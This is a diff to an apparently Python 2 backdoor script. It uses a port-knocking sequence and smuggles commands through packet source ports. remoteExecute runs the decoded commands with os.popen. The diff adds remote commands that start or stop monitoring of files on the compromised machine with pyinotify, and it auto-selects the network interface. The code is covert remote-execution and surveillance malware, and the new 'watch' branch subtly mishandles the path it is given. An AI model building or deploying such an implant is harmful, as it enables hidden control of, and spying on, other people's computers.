@@ -38,12 +38,12 @@ import time
 import os
 from itertools import izip, cycle
 from multiprocessing import Queue
+import netifaces as ni
 
 
-
-
+interface_list = ni.interfaces()
 ################ USER DEFINED ########################################
-INTERFACE_ = 'em1'
+INTERFACE_ = interface_list[-1]   # Can change this to customize, otherwise will use default.
 
 # Ports must be the same as the client.
 KNOCK = [1075, 2078, 3079, 4067, 5075]
@@ -165,9 +165,8 @@ def remoteExecute(packet):
             command += chr(packet[0][2].sport)
             if len(command) == cmdLen:
                 print "Running Command: " + command
-                if command.startswith('watch'):
-                    x, y = command.split(' ')
-                    watch_queue.put(y)
+                if command.startswith('watch') or command.startswith('remove') or command.startswith('twatch'):
+                    watch_queue.put(command)
                 else:
                     decrypt_command = os.popen(command)
                     command_result = decrypt_command.read()
@@ -412,13 +411,21 @@ def fileMonitor(watch, q):
     notifier = pyinotify.ThreadedNotifier(wm, handler)
     notifier.start()
 
-    wdd = wm.add_watch(watch, MASK, rec=True)
+    wm.add_watch(watch, MASK, rec=True, auto_add=True)
 
     while True:
         try:
             new_watch = q.get(True, 1)
-            print 'Adding:', new_watch
-            wm.add_watch(new_watch, MASK, rec=True)
+            x, y = new_watch.split(' ')
+            if x == 'watch':
+                print 'Adding:', y
+                wm.add_watch(new_watch, MASK, rec=True, auto_add=True)
+            elif x == 'twatch':
+                print 'Adding transient watch:', y
+                wm.watch_transient_file(y, pyinotify.IN_MODIFY, EventHandler)
+            else:
+                print 'Removing:', y
+                wm.rm_watch(wm.get_wd(y), rec=True)
         except Exception:
             pass
     #notifier.loop()
